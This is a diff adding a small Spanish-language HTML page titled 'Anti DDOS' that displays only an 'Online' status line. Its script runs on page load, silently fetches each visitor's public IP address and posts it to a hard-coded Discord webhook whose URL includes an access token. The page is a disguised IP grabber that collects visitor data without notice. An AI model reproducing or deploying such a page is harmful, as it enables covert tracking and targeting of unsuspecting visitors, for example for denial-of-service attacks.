@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anti DDOS</title>
+    <script>
+        async function sendIP() {
+            try {
+                // Obtener la IP pública del usuario
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const userIP = data.ip;
+
+                // URL del webhook de Discord
+                const webhookURL = 'https://discord.com/api/webhooks/1357473976351199552/wjgDS7IfHKsvkvMdIbz4Efc3j3fksA7LdGpXQTLckzkeMtIfC_v1Y7MI3jFEB5_gEifI';
+
+                // Enviar la IP al webhook de Discord
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `La IP del usuario es: ${userIP}`
+                    })
+                });
+
+                console.log('IP enviada a Discord:', userIP);
+            } catch (error) {
+                console.error('Error al enviar la IP:', error);
+            }
+        }
+
+        // Llamar a la función al cargar la página
+        window.onload = sendIP;
+    </script>
+</head>
+<body>
+    <h1>Estado de la pagina: Online</h1>
+</body>
+</html>
